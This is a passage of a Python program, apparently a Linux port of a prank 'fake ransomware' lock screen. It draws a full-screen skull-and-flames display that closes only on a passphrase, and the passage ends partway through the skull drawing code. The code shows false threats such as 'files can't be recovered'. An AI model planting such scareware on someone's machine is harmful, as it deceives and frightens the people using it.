#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fake_ransom.py - Linux port of fake_ransom.cs

A fake ransomware lock screen.  It is a prank: nothing is encrypted,
nothing is deleted, and the only way out is the passphrase below (or
killing the process / switching to a TTY).

The artwork is drawn with Cairo so it works on any Linux desktop that
has PyGObject and GTK 3 or GTK 4 installed.  GTK 4 is preferred; set
FAKE_RANSOM_GTK=3 to force GTK 3.

Run:
    python3 fake_ransom.py

Test without opening a window:
    python3 fake_ransom.py --selftest
    python3 fake_ransom.py --render-test /tmp/fake_ransom.png

Windowed test (does not cover the desktop):
    python3 fake_ransom.py --windowed 1280x720 --duration 5

Password: bomboclat
"""

from __future__ import annotations

import argparse
import math
import os
import random
import sys
import time
import traceback
import warnings
import threading
import subprocess

from dataclasses import dataclass
from typing import List, Optional, Sequence, Tuple

try:
    import cairo
except ImportError:  # --selftest still works without pycairo
    cairo = None

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

PASSPHRASE = "bomboclat"
MAX_INPUT_LENGTH = 16
PLACEHOLDER = "KEEP INTERNET ON, OTHERWISE FILES CAN'T BE RECOVERED"
DENIED_TEXT = "ACCESS DENIED"

# All colours in this file are 0..1 RGBA tuples, like Cairo wants.
Color = Tuple[float, float, float, float]
Rect = Tuple[float, float, float, float]




def rgba(r: int, g: int, b: int, a: int = 255) -> Color:
    return (r / 255.0, g / 255.0, b / 255.0, a / 255.0)


def clamp(value: float, low: float, high: float) -> float:
    return max(low, min(high, value))


def clamp_alpha(value: float) -> int:
    return max(0, min(255, int(value)))


def rect_right(r: Rect) -> float:
    return r[0] + r[2]


def rect_bottom(r: Rect) -> float:
    return r[1] + r[3]


# ---------------------------------------------------------------------------
# Pure input state (no GUI needed, so --selftest can run anywhere)
# ---------------------------------------------------------------------------

class RansomState:
    """Keyboard-only password state, matching fake_ransom.cs."""

    def __init__(self) -> None:
        self.typed: str = ""
        self.denied_until: float = 0.0
        self.closing: bool = False
        self.allow_close: bool = False

    def matches(self) -> bool:
        return self.typed.strip().lower() == PASSPHRASE

    def type_char(self, ch: str) -> None:
        if self.closing:
            return
        if len(ch) != 1 or not ch.isprintable():
            return
        if len(self.typed) >= MAX_INPUT_LENGTH:
            return
        self.typed += ch

    def backspace(self) -> None:
        if self.closing:
            return
        if self.typed:
            self.typed = self.typed[:-1]

    def enter(self, now: float) -> bool:
        """Return True when the passphrase was accepted."""
        if self.closing:
            return True
        if self.matches():
            self.closing = True
            self.allow_close = True
            return True
        self.denied_until = now + 2.4
        self.typed = ""
        return False

    def deny(self, now: float) -> None:
        self.denied_until = now + 2.4
        self.typed = ""

    @property
    def denied(self) -> bool:
        return time.monotonic() < self.denied_until


# ---------------------------------------------------------------------------
# Dependency loading
# ---------------------------------------------------------------------------

def load_pango():
    """Load Pango/PangoCairo.  This works without a display."""
    try:
        import gi
        gi.require_version("Pango", "1.0")
        gi.require_version("PangoCairo", "1.0")
        from gi.repository import Pango, PangoCairo
        return Pango, PangoCairo
    except Exception as exc:  # pragma: no cover - depends on the machine
        print(
            "fake_ransom.py needs PyGObject, Pango and Cairo.\n"
            "  Debian/Ubuntu/Mint: sudo apt install python3-gi gir1.2-pango-1.0 python3-cairo\n"
            "  Fedora/RHEL:        sudo dnf install python3-gobject pango cairo python3-cairo\n"
            "  Arch/Omarchy:       sudo pacman -S python-gobject pango cairo python-cairo\n"
            f"\nDetails: {exc}",
            file=sys.stderr,
        )
        raise SystemExit(1)


def load_gtk():
    """Load GTK 4 when possible, otherwise GTK 3."""
    try:
        import gi
        forced = os.environ.get("FAKE_RANSOM_GTK", "").strip()
        version = ""
        if forced in ("3", "3.0"):
            version = "3.0"
        elif forced in ("4", "4.0"):
            version = "4.0"
        else:
            try:
                gi.require_version("Gtk", "4.0")
                version = "4.0"
            except ValueError:
                version = "3.0"

        gi.require_version("Gdk", version)
        gi.require_version("Gtk", version)
        gi.require_version("Pango", "1.0")
        gi.require_version("PangoCairo", "1.0")
        from gi.repository import Gdk, Gio, GLib, Gtk, Pango, PangoCairo
        return version, Gtk, Gdk, Gio, GLib, Pango, PangoCairo
    except Exception as exc:  # pragma: no cover - depends on the machine
        print(
            "fake_ransom.py needs PyGObject and GTK 3 or GTK 4.\n"
            "  Debian/Ubuntu/Mint: sudo apt install python3-gi gir1.2-gtk-4.0 python3-cairo\n"
            "                      (or gir1.2-gtk-3.0)\n"
            "  Fedora/RHEL:        sudo dnf install python3-gobject gtk4 python3-cairo\n"
            "                      (or gtk3)\n"
            "  Arch/Omarchy:       sudo pacman -S python-gobject gtk4 python-cairo\n"
            "                      (or gtk3)\n"
            f"\nDetails: {exc}",
            file=sys.stderr,
        )
        raise SystemExit(1)


# ---------------------------------------------------------------------------
# Pango helpers
# ---------------------------------------------------------------------------

def make_layout(ctx, text: str, family: str, size_px: float, bold: bool,
                Pango, PangoCairo):
    layout = PangoCairo.create_layout(ctx)
    desc = Pango.FontDescription()
    desc.set_family(family)
    desc.set_absolute_size(max(1.0, float(size_px)) * Pango.SCALE)
    if bold:
        desc.set_weight(Pango.Weight.BOLD)
    layout.set_font_description(desc)
    layout.set_text(text, -1)
    return layout


def layout_size(layout) -> Tuple[int, int]:
    return layout.get_pixel_size()


def show_layout_centered(ctx, layout, rect: Rect, dx: float, dy: float,
                         PangoCairo) -> None:
    pw, ph = layout.get_pixel_size()
    x = rect[0] + (rect[2] - pw) / 2.0 + dx
    y = rect[1] + (rect[3] - ph) / 2.0 + dy
    ctx.move_to(x, y)
    PangoCairo.show_layout(ctx, layout)


def fit_font_size(ctx, family: str, size: float, bold: bool,
                  sample: str, max_width: float, Pango, PangoCairo) -> float:
    size = max(8.0, float(size))
    while size > 8.0:
        layout = make_layout(ctx, sample, family, size, bold, Pango, PangoCairo)
        if layout.get_pixel_size()[0] <= max_width:
            break
        size *= 0.94
    return max(8.0, size)


def installed_families(PangoCairo) -> set:
    try:
        font_map = PangoCairo.FontMap.get_default()
        return {f.get_name().lower() for f in font_map.list_families()}
    except Exception:
        return set()


def pick_family(candidates: Sequence[str], fallback: str, PangoCairo) -> str:
    names = installed_families(PangoCairo)
    for candidate in candidates:
        if candidate.lower() in names:
            return candidate
    return fallback



def pick_display_family(PangoCairo) -> str:
    return pick_family(
        (
            "Old English Text MT",
            "Blackadder ITC",
            "Cloister Black",
            "UnifrakturMaguntia",
            "UnifrakturCook",
            "Goudy Text MT",
            "Chiller",
            "Georgia",
            "Times New Roman",
            "Liberation Serif",
            "DejaVu Serif",
            "Nimbus Roman",
            "Impact",
        ),
        "serif",
        PangoCairo,
    )


def pick_mono_family(PangoCairo) -> str:
    return pick_family(
        (
            "Consolas",
            "DejaVu Sans Mono",
            "Liberation Mono",
            "Nimbus Mono PS",
            "Noto Sans Mono",
        ),
        "monospace",
        PangoCairo,
    )


# ---------------------------------------------------------------------------
# Layout
# ---------------------------------------------------------------------------

@dataclass
class Layout:
    w: int
    h: int
    skull: Rect
    locked: Rect
    name: Rect
    field: Rect
    status: Rect
    locked_size: float
    name_size: float
    placeholder_size: float
    status_size: float
    title_top: int = 0


def compute_layout(w: int, h: int, ctx, display_family: str, mono_family: str,
                   Pango, PangoCairo) -> Layout:
    skull_size = min(w * 0.56, h * 0.62)
    skull_top = h * 0.012
    skull = ((w - skull_size) / 2.0, skull_top, skull_size, skull_size)

    # The skull path's chin sits at 0.945 of its square canvas.
    chin = skull_top + skull_size * 0.945
    locked_top = chin + h * 0.016
    locked_height = max(16.0, h * 0.036)
    locked = (0.0, locked_top, float(w), locked_height)

    name_top = locked_top + locked_height * 1.05
    name_height = max(30.0, h * 0.100)
    name = (0.0, name_top, float(w), name_height)

    field_width = min(w * 0.48, h * 0.80)
    field_height = clamp(h * 0.062, 44.0, 120.0)
    field_top = min(name_top + name_height + h * 0.045, h * 0.80)
    field = ((w - field_width) / 2.0, field_top, field_width, field_height)
    status = (0.0, rect_bottom(field) + h * 0.018, float(w),
              max(18.0, h * 0.035))

    locked_size = fit_font_size(
        ctx, display_family, max(12.0, h * 0.030), False,
        "Locked by", w * 0.58, Pango, PangoCairo)
    name_size = fit_font_size(
        ctx, display_family, max(20.0, h * 0.080), True,
        "BossDefender", w * 0.90, Pango, PangoCairo)
    placeholder_size = max(11.0, field_height * 0.34)
    status_size = max(11.0, h * 0.021)

    return Layout(w, h, skull, locked, name, field, status,
                  locked_size, name_size, placeholder_size, status_size)


# ---------------------------------------------------------------------------
# Cairo drawing helpers
# ---------------------------------------------------------------------------

def set_color(ctx, color: Color) -> None:
    ctx.set_source_rgba(*color)


def soft_glow(ctx, cx: float, cy: float, rx: float, ry: float,
              center: Color, edge: Color) -> None:
    """Elliptical radial glow, the Cairo equivalent of PathGradientBrush."""
    if rx <= 0.1 or ry <= 0.1:
        return
    ctx.save()
    ctx.translate(cx, cy)
    ctx.scale(rx, ry)
    pattern = cairo.RadialGradient(0.0, 0.0, 0.0, 0.0, 0.0, 1.0)
    pattern.add_color_stop_rgba(0.0, *center)
    pattern.add_color_stop_rgba(1.0, *edge)
    ctx.set_source(pattern)
    ctx.arc(0.0, 0.0, 1.0, 0.0, math.tau)
    ctx.fill()
    ctx.restore()


def fill_linear(ctx, x0: float, y0: float, x1: float, y1: float,
                stops: Sequence[Tuple[float, Color]]) -> None:
    pattern = cairo.LinearGradient(x0, y0, x1, y1)
    for position, color in stops:
        pattern.add_color_stop_rgba(position, *color)
    ctx.set_source(pattern)


def rounded_rect_path(ctx, x: float, y: float, w: float, h: float,
                      radius: float) -> None:
    r = min(radius, abs(w) / 2.0, abs(h) / 2.0)
    if r <= 0.1:
        ctx.rectangle(x, y, w, h)
        return
    ctx.new_sub_path()
    ctx.arc(x + w - r, y + r, r, -math.pi / 2.0, 0.0)
    ctx.arc(x + w - r, y + h - r, r, 0.0, math.pi / 2.0)
    ctx.arc(x + r, y + h - r, r, math.pi / 2.0, math.pi)
    ctx.arc(x + r, y + r, r, math.pi, 3.0 * math.pi / 2.0)
    ctx.close_path()


def path_bounds(ctx) -> Rect:
    x1, y1, x2, y2 = ctx.path_extents()
    return (x1, y1, max(0.0, x2 - x1), max(0.0, y2 - y1))


def catmull_rom_path(ctx, points: Sequence[Tuple[float, float]],
                     tension: float = 0.45) -> None:
    """Approximate GDI+ GraphicsPath.AddCurve(points, tension)."""
    if not points:
        return
    if len(points) == 1:
        ctx.move_to(*points[0])
        return
    ctx.move_to(*points[0])
    for i in range(len(points) - 1):
        p0 = points[max(0, i - 1)]
        p1 = points[i]
        p2 = points[i + 1]
        p3 = points[min(len(points) - 1, i + 2)]
        c1x = p1[0] + (p2[0] - p0[0]) * tension / 3.0
        c1y = p1[1] + (p2[1] - p0[1]) * tension / 3.0
        c2x = p2[0] - (p3[0] - p1[0]) * tension / 3.0
        c2y = p2[1] - (p3[1] - p1[1]) * tension / 3.0
        ctx.curve_to(c1x, c1y, c2x, c2y, p2[0], p2[1])


def ellipse(ctx, x: float, y: float, rx: float, ry: float) -> None:
    ctx.save()
    ctx.translate(x, y)
    ctx.scale(max(0.01, rx), max(0.01, ry))
    ctx.arc(0.0, 0.0, 1.0, 0.0, math.tau)
    ctx.restore()


def fill_ellipse(ctx, x: float, y: float, rx: float, ry: float,
                 color: Color) -> None:
    ctx.new_path()
    ellipse(ctx, x, y, rx, ry)
    set_color(ctx, color)
    ctx.fill()


def stroke_ellipse(ctx, x: float, y: float, rx: float, ry: float,
                   color: Color, width: float) -> None:
    ctx.new_path()
    ellipse(ctx, x, y, rx, ry)
    set_color(ctx, color)
    ctx.set_line_width(width)
    ctx.stroke()


# ---------------------------------------------------------------------------
# Flame / ember / background art (port of HellArt)
# ---------------------------------------------------------------------------

class FlameSpec:
    __slots__ = ("x", "y", "width", "height", "phase", "lean", "intensity")

    def __init__(self, x, y, width, height, phase, lean, intensity):
        self.x = x
        self.y = y
        self.width = width
        self.height = height
        self.phase = phase
        self.lean = lean
        self.intensity = intensity


class EmberSpec:
    __slots__ = ("x", "start", "speed", "size", "phase", "sway")

    def __init__(self, x, start, speed, size, phase, sway):
        self.x = x
        self.start = start
        self.speed = speed
        self.size = size
        self.phase = phase
        self.sway = sway


def create_mane_flames() -> List[FlameSpec]:
    rng = random.Random(77113)
    result: List[FlameSpec] = []
    for i in range(30):
        t = i / 29.0
        theta = math.pi + t * math.pi
        bx = 300.0 + math.cos(theta) * 195.0
        by = 292.0 + math.sin(theta) * 190.0
        topness = clamp((300.0 - by) / 210.0, 0.0, 1.0)
        height = 135.0 + rng.randint(0, 145) + topness * 85.0
        width = 27.0 + rng.randint(0, 44)
        lean = (bx - 300.0) * 0.30 + rng.randint(-24, 24)
        result.append(FlameSpec(
            bx, by, width, height,
            rng.random() * 6.283, lean,
            0.82 + rng.random() * 0.28,
        ))
    for i in range(8):
        left = i % 2 == 0
        bx = (108.0 - i * 2.0) if left else (492.0 + i * 2.0)
        by = 345.0 + i * 14.0
        height = 95.0 + rng.randint(0, 100)
        width = 24.0 + rng.randint(0, 27)
        result.append(FlameSpec(
            bx, by, width, height,
            rng.random() * 6.283,
            (-1.0 if left else 1.0) * (35.0 + rng.randint(0, 34)),
            0.75 + rng.random() * 0.25,
        ))
    return result


def create_foreground_flames() -> List[FlameSpec]:
    rng = random.Random(4412)
    result: List[FlameSpec] = []
    for i in range(9):
        bx = 185.0 + i * 29.0 + rng.randint(-8, 8)
        by = 84.0 + rng.randint(0, 96)
        height = 75.0 + rng.randint(0, 105)
        width = 17.0 + rng.randint(0, 20)
        result.append(FlameSpec(
            bx, by, width, height,
            rng.random() * 6.283,
            rng.randint(-35, 35),
            0.85 + rng.random() * 0.30,
        ))
    result.append(FlameSpec(135.0, 280.0, 25.0, 105.0, 1.2, -30.0, 0.9))
    result.append(FlameSpec(465.0, 280.0, 25.0, 105.0, 3.8, 30.0, 0.9))
    return result


def create_embers() -> List[EmberSpec]:
    rng = random.Random(22391)
    result: List[EmberSpec] = []
    for _ in range(190):
        result.append(EmberSpec(
            rng.random(),
            rng.random(),
            0.018 + rng.random() * 0.070,
            0.0012 + rng.random() * 0.0022,
            rng.random() * 6.283,
            1.3 + rng.random() * 2.7,
        ))
    return result


MANE_FLAMES = create_mane_flames()
FORE_FLAMES = create_foreground_flames()
EMBERS = create_embers()


def flame_path(ctx, bx: float, by: float, width: float, height: float,
               tip_x: float, tip_y: float, wobble: float) -> None:
    half = max(2.0, width * 0.5)
    ctx.new_sub_path()
    ctx.move_to(bx - half, by)
    ctx.curve_to(
        bx - half * 1.30 + wobble, by - height * 0.25,
        tip_x - half * 0.65, by - height * 0.72,
        tip_x, tip_y,
    )
    ctx.curve_to(
        tip_x + half * 0.55, by - height * 0.70,
        bx + half * 1.25 + wobble, by - height * 0.26,
        bx + half, by,
    )
    ctx.close_path()


def draw_flame(ctx, bx: float, by: float, width: float, height: float,
               phase: float, lean: float, time_s: float, intensity: float,
               foreground: bool) -> None:
    breathe = 0.87 + 0.13 * math.sin(time_s * 3.2 + phase * 1.7)
    h = max(8.0, height * breathe)
    sway = (math.sin(time_s * 2.15 + phase) * 0.50 +
            math.sin(time_s * 4.7 + phase * 1.9) * 0.22)
    tip_x = bx + lean + sway * width
    tip_y = by - h
    wobble = math.sin(time_s * 3.5 + phase * 2.1) * width * 0.13

    # Outer tongue.
    flame_path(ctx, bx, by, width, h, tip_x, tip_y, wobble)
    alpha = clamp_alpha((78 if foreground else 44) * intensity +
                        int(18 * intensity))
    fill_linear(ctx, tip_x, tip_y, bx, by, (
        (0.0, rgba(255, 88, 14, 0)),
        (1.0, rgba(255, 88, 14, alpha)),
    ))
    ctx.fill()

    # Middle tongue.
    flame_path(ctx, bx, by, width * 0.62, h * 0.76,
               tip_x + wobble * 0.6, by - h * 0.76, wobble * 0.7)
    alpha = clamp_alpha((114 if foreground else 64) * intensity + 18)
    fill_linear(ctx, tip_x, tip_y, bx, by, (
        (0.0, rgba(255, 158, 34, 0)),
        (1.0, rgba(255, 158, 34, alpha)),
    ))
    ctx.fill()

    # Hot core.
    flame_path(ctx, bx, by, width * 0.26, h * 0.47,
               tip_x + wobble * 0.45, by - h * 0.47, wobble * 0.4)
    alpha = clamp_alpha((150 if foreground else 78) * intensity + 16)
    fill_linear(ctx, tip_x, tip_y, bx, by, (
        (0.0, rgba(255, 235, 150, 0)),
        (1.0, rgba(255, 235, 150, alpha)),
    ))
    ctx.fill()


def draw_mane_flames(ctx, time_s: float) -> None:
    soft_glow(ctx, 300.0, 245.0, 310.0, 330.0,
              rgba(255, 72, 9, 58), rgba(90, 10, 1, 0))
    soft_glow(ctx, 300.0, 190.0, 205.0, 240.0,
              rgba(255, 144, 32, 45), rgba(180, 40, 3, 0))
    for flame in MANE_FLAMES:
        draw_flame(ctx, flame.x, flame.y, flame.width, flame.height,
                   flame.phase, flame.lean, time_s, flame.intensity, False)


def draw_foreground_flames(ctx, time_s: float) -> None:
    for flame in FORE_FLAMES:
        draw_flame(ctx, flame.x, flame.y, flame.width, flame.height,
                   flame.phase, flame.lean, time_s, flame.intensity, True)


def draw_embers(ctx, w: float, h: float, seconds: float,
                foreground: bool) -> None:
    if foreground:
        outer_color = rgba(255, 96, 24, 56)
        mid_color = rgba(255, 130, 42, 145)
        core_color = rgba(255, 218, 150, 235)
    else:
        outer_color = rgba(255, 80, 18, 20)
        mid_color = rgba(255, 120, 34, 70)
        core_color = rgba(255, 194, 120, 170)

    visible = []
    for i, ember in enumerate(EMBERS):
        if (i % 5 == 0) != foreground:
            continue
        p = (ember.start + seconds * ember.speed) % 1.0
        y = h * (1.05 - p * 1.10)
        x = (w * ember.x +
             math.sin(seconds * ember.sway + ember.phase) * w * 0.014)
        flicker = 0.55 + 0.45 * math.sin(seconds * 4.1 + ember.phase)
        size = max(0.8, h * ember.size * (1.45 if foreground else 1.0))
        if not foreground and flicker < 0.18:
            continue
        visible.append((x, y, size))

    # Draw all of one colour at a time.  This is much faster than changing
    # the Cairo source for every ember.
    set_color(ctx, outer_color)
    for x, y, size in visible:
        ctx.new_path()
        ctx.arc(x, y, size * 4.0, 0.0, math.tau)
        ctx.fill()
    set_color(ctx, mid_color)
    for x, y, size in visible:
        ctx.new_path()
        ctx.arc(x, y, size * 1.8, 0.0, math.tau)
        ctx.fill()
    set_color(ctx, core_color)
    for x, y, size in visible:
        ctx.new_path()
        ctx.arc(x, y, size * 0.70, 0.0, math.tau)
        ctx.fill()


def draw_background_life(ctx, w: float, h: float, time_s: float) -> None:
    pulse = 0.5 + 0.5 * math.sin(time_s * 1.7)
    soft_glow(ctx, w * 0.50, h * 0.28, w * 0.33, h * 0.33,
              rgba(255, 70, 8, 28 + int(14 * pulse)), rgba(40, 5, 1, 0))
    soft_glow(ctx, w * 0.08, h * 0.77, w * 0.18, h * 0.23,
              rgba(255, 82, 12, 32 + int(22 * pulse)), rgba(50, 8, 1, 0))
    soft_glow(ctx, w * 0.93, h * 0.74, w * 0.17, h * 0.24,
              rgba(255, 70, 10, 28 + int(18 * (1.0 - pulse))),
              rgba(50, 7, 1, 0))
    soft_glow(ctx, w * 0.50, h * 1.02, w * 0.44, h * 0.14,
              rgba(255, 100, 18, 48), rgba(80, 10, 2, 0))

    for i in range(9):
        x = w * (0.05 + i * 0.112) + math.sin(time_s * 0.7 + i) * w * 0.01
        width = w * (0.055 + 0.025 * ((i + 1) % 3))
        height = h * (0.075 + 0.035 * ((i * 2) % 4))
        draw_flame(ctx, x, h * 1.025, width, height,
                   i * 1.71, (-1.0 if i % 2 == 0 else 1.0) * w * 0.008,
                   time_s, 0.42, False)

    drift = math.sin(time_s * 0.18) * w * 0.02
    soft_glow(ctx, w * 0.30 + drift, h * 0.16, w * 0.23, h * 0.09,
              rgba(45, 10, 8, 18), rgba(2, 0, 0, 0))
    soft_glow(ctx, w * 0.74 - drift, h * 0.22, w * 0.28, h * 0.10,
              rgba(52, 12, 8, 16), rgba(2, 0, 0, 0))


def draw_title_aura(ctx, locked: Rect, name: Rect, time_s: float) -> None:
    cy = (locked[1] + rect_bottom(name)) / 2.0
    pulse = 0.5 + 0.5 * math.sin(time_s * 1.4 + 0.8)
    soft_glow(ctx, locked[0] + locked[2] * 0.5, cy,
              locked[2] * 0.31, name[3] * 0.90,
              rgba(255, 58, 8, 15 + int(8 * pulse)), rgba(30, 2, 0, 0))


def build_background_surface(w: int, h: int):
    """Bake the low-resolution burning-city backdrop, then scale it up."""
    bw = max(80, w // 6)
    bh = max(50, h // 6)
    low = cairo.ImageSurface(cairo.FORMAT_ARGB32, bw, bh)
    ctx = cairo.Context(low)
    ctx.set_antialias(cairo.ANTIALIAS_BEST)

    fill_linear(ctx, 0, 0, 0, bh, (
        (0.0, rgba(6, 2, 2)),
        (1.0, rgba(27, 4, 1)),
    ))
    ctx.rectangle(0, 0, bw, bh)
    ctx.fill()

    soft_glow(ctx, bw * 0.50, bh * 0.47, bw * 0.50, bh * 0.48,
              rgba(118, 18, 3, 92), rgba(18, 2, 1, 0))
    soft_glow(ctx, bw * 0.22, bh * 0.57, bw * 0.31, bh * 0.31,
              rgba(175, 39, 5, 70), rgba(28, 4, 1, 0))
    soft_glow(ctx, bw * 0.82, bh * 0.52, bw * 0.29, bh * 0.34,
              rgba(160, 27, 4, 58), rgba(24, 3, 1, 0))

    soft_glow(ctx, bw * 0.80, bh * 0.20, bw * 0.17, bw * 0.17,
              rgba(255, 112, 36, 65), rgba(80, 16, 3, 0))
    fill_ellipse(ctx, bw * 0.80, bh * 0.17, bw * 0.025, bw * 0.025,
                 rgba(255, 132, 58, 80))

    soft_glow(ctx, bw * 0.38, bh * 0.31, bw * 0.30, bh * 0.16,
              rgba(46, 10, 6, 34), rgba(8, 1, 1, 0))
    soft_glow(ctx, bw * 0.68, bh * 0.37, bw * 0.36, bh * 0.18,
              rgba(42, 8, 5, 30), rgba(8, 1, 1, 0))

    draw_ruined_skyline(ctx, bw, bh)

    set_color(ctx, rgba(170, 35, 5, 30))
    ctx.rectangle(0, bh * 0.48, bw, bh * 0.16)
    ctx.fill()

    draw_ground_fire(ctx, bw, bh)

    grain = random.Random(90210)
    for _ in range(1500):
        x = grain.random() * bw
        y = grain.random() * bh
        alpha = 8 + grain.randint(0, 21)
        if grain.randint(0, 3) == 0:
            set_color(ctx, rgba(255, 116, 54, alpha))
        else:
            set_color(ctx, rgba(0, 0, 0, alpha))
        ctx.rectangle(x, y, 1.1, 1.1)
        ctx.fill()

    # Vignette baked into the cached scene.
    vignette = cairo.RadialGradient(
        bw * 0.50, bh * 0.46, 0.0,
        bw * 0.50, bh * 0.46, max(bw, bh) * 0.78)
    vignette.add_color_stop_rgba(0.0, 0, 0, 0, 0)
    vignette.add_color_stop_rgba(0.52, 0, 0, 0, 0)
    vignette.add_color_stop_rgba(1.0, 0, 0, 0, 0.67)
    ctx.set_source(vignette)
    ctx.rectangle(0, 0, bw, bh)
    ctx.fill()

    full = cairo.ImageSurface(cairo.FORMAT_ARGB32, w, h)
    fctx = cairo.Context(full)
    fctx.scale(w / bw, h / bh)
    pattern = cairo.SurfacePattern(low)
    pattern.set_filter(cairo.FILTER_BEST)
    fctx.set_source(pattern)
    fctx.paint()
    return full


def draw_ruined_skyline(ctx, bw: float, bh: float) -> None:
    def polygon(points, color):
        ctx.new_path()
        ctx.move_to(*points[0])
        for point in points[1:]:
            ctx.line_to(*point)
        ctx.close_path()
        set_color(ctx, color)
        ctx.fill()

    far = rgba(8, 2, 1, 145)
    ruin = rgba(4, 1, 1, 228)

    polygon([
        (bw * 0.20, bh * 0.88), (bw * 0.20, bh * 0.59),
        (bw * 0.25, bh * 0.55), (bw * 0.29, bh * 0.62),
        (bw * 0.34, bh * 0.58), (bw * 0.36, bh * 0.88),
    ], far)
    polygon([
        (bw * 0.57, bh * 0.88), (bw * 0.60, bh * 0.63),
        (bw * 0.65, bh * 0.58), (bw * 0.69, bh * 0.66),
        (bw * 0.73, bh * 0.61), (bw * 0.77, bh * 0.88),
    ], far)
    polygon([
        (0, bh * 0.96), (0, bh * 0.35), (bw * 0.045, bh * 0.32),
        (bw * 0.050, bh * 0.47), (bw * 0.075, bh * 0.42),
        (bw * 0.095, bh * 0.55), (bw * 0.125, bh * 0.47),
        (bw * 0.155, bh * 0.60), (bw * 0.175, bh * 0.55),
        (bw * 0.19, bh * 0.96),
    ], ruin)
    polygon([
        (bw * 0.81, bh * 0.96), (bw * 0.84, bh * 0.40),
        (bw * 0.875, bh * 0.44), (bw * 0.89, bh * 0.34),
        (bw * 0.925, bh * 0.39), (bw * 0.94, bh * 0.29),
        (bw * 0.965, bh * 0.42), (bw, bh * 0.36),
        (bw, bh * 0.96),
    ], ruin)

    rng = random.Random(117)
    for i in range(16):
        if i % 2 == 0:
            x = bw * (0.025 + rng.random() * 0.13)
        else:
            x = bw * (0.85 + rng.random() * 0.12)
        y = bh * (0.43 + rng.random() * 0.40)
        ww = bw * (0.002 + rng.random() * 0.005)
        hh = bh * (0.004 + rng.random() * 0.010)
        set_color(ctx, rgba(255, 98, 30, 55 + rng.randint(0, 59)))
        ctx.rectangle(x, y, ww, hh)
        ctx.fill()

    set_color(ctx, rgba(4, 1, 1, 210))
    ctx.set_line_width(max(1.0, bw * 0.006))
    draw_cross(ctx, bw * 0.24, bh * 0.77, bw * 0.014, bh * 0.12)
    draw_cross(ctx, bw * 0.29, bh * 0.79, bw * 0.011, bh * 0.09)
    draw_cross(ctx, bw * 0.71, bh * 0.78, bw * 0.013, bh * 0.11)
    draw_cross(ctx, bw * 0.76, bh * 0.81, bw * 0.010, bh * 0.08)


def draw_cross(ctx, x: float, y: float, half_width: float,
               height: float) -> None:
    ctx.move_to(x, y)
    ctx.line_to(x, y + height)
    ctx.move_to(x - half_width, y + height * 0.24)
    ctx.line_to(x + half_width, y + height * 0.24)
    ctx.stroke()


def draw_ground_fire(ctx, bw: float, bh: float) -> None:
    y = bh * 0.88
    xs = (0.08, 0.18, 0.30, 0.48, 0.62, 0.76, 0.90)
    for i, x_ratio in enumerate(xs):
        x = bw * x_ratio
        radius = bw * (0.035 + 0.025 * (i % 3))
        soft_glow(ctx, x, y + bh * 0.03, radius, radius * 0.55,
                  rgba(255, 88, 17, 120), rgba(90, 14, 2, 0))
        soft_glow(ctx, x, y + bh * 0.025, radius * 0.42, radius * 0.30,
                  rgba(255, 187, 62, 145), rgba(255, 92, 8, 0))

    fill_linear(ctx, 0, bh * 0.78, 0, bh, (
        (0.0, rgba(255, 72, 8, 0)),
        (1.0, rgba(135, 19, 2, 82)),
    ))
    ctx.rectangle(0, bh * 0.78, bw, bh * 0.22)
    ctx.fill()


# ---------------------------------------------------------------------------
# Skull geometry (all coordinates are in the 600x600 skull canvas)
# ---------------------------------------------------------------------------

def skull_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(300, 40)
    ctx.curve_to(378, 40, 460, 88, 486, 170)
    ctx.curve_to(497, 210, 490, 248, 476, 282)
    ctx.curve_to(467, 307, 452, 330, 448, 356)
    ctx.curve_to(444, 386, 428, 414, 416, 442)
    ctx.curve_to(402, 474, 383, 506, 348, 530)
    ctx.curve_to(332, 543, 315, 554, 300, 562)
    ctx.curve_to(285, 554, 268, 543, 252, 530)
    ctx.curve_to(217, 506, 198, 474, 184, 442)
    ctx.curve_to(172, 414, 156, 386, 152, 356)
    ctx.curve_to(148, 330, 133, 307, 124, 282)
    ctx.curve_to(110, 248, 103, 210, 114, 170)
    ctx.curve_to(140, 88, 222, 40, 300, 40)
    ctx.close_path()


def socket_path(ctx, left: bool) -> None:
    ctx.new_path()
    if left:
        ctx.move_to(144, 226)
        ctx.curve_to(168, 206, 214, 214, 246, 234)
        ctx.curve_to(260, 242, 272, 254, 280, 268)
        ctx.curve_to(262, 288, 236, 300, 208, 298)
        ctx.curve_to(180, 296, 154, 278, 146, 252)
        ctx.curve_to(142, 242, 141, 234, 144, 226)
    else:
        ctx.move_to(456, 226)
        ctx.curve_to(432, 206, 386, 214, 354, 234)
        ctx.curve_to(340, 242, 328, 254, 320, 268)
        ctx.curve_to(338, 288, 364, 300, 392, 298)
        ctx.curve_to(420, 296, 446, 278, 454, 252)
        ctx.curve_to(458, 242, 459, 234, 456, 226)
    ctx.close_path()


def eye_slit_path(ctx, cx: float, cy: float, left: bool,
                  scale: float) -> None:
    side = 1.0 if left else -1.0
    half = 47.0 * scale
    width = 22.0 * scale
    height = 10.0 * scale
    ctx.new_path()
    ctx.move_to(cx - half * side, cy - height * 0.65)
    ctx.curve_to(
        cx - width * 0.55 * side, cy - height * 1.65,
        cx + width * 0.55 * side, cy + height * 0.20,
        cx + half * side, cy + height * 0.80,
    )
    ctx.curve_to(
        cx + width * 0.60 * side, cy + height * 1.45,
        cx - width * 0.55 * side, cy + height * 1.10,
        cx - half * side, cy - height * 0.65,
    )
    ctx.close_path()


def nose_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(300, 314)
    ctx.curve_to(294, 330, 282, 344, 272, 356)
    ctx.curve_to(284, 364, 293, 372, 300, 386)
    ctx.curve_to(307, 372, 316, 364, 328, 356)
    ctx.curve_to(318, 344, 306, 330, 300, 314)
    ctx.close_path()


def mouth_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(190, 407)
    ctx.curve_to(226, 395, 264, 401, 300, 401)
    ctx.curve_to(336, 401, 374, 395, 410, 407)
    ctx.curve_to(423, 432, 409, 468, 381, 489)
    ctx.curve_to(350, 511, 250, 511, 219, 489)
    ctx.curve_to(191, 468, 177, 432, 190, 407)
    ctx.close_path()


def tooth_path(ctx, x: float, y: float, w: float, h: float,
               upper: bool, index: int) -> None:
    bend = (1.0 if index % 2 == 0 else -1.0) * w * 0.08
    ctx.new_path()
    if upper:
        ctx.move_to(x, y)
        ctx.curve_to(
            x + w * 0.10, y + h * 0.40,
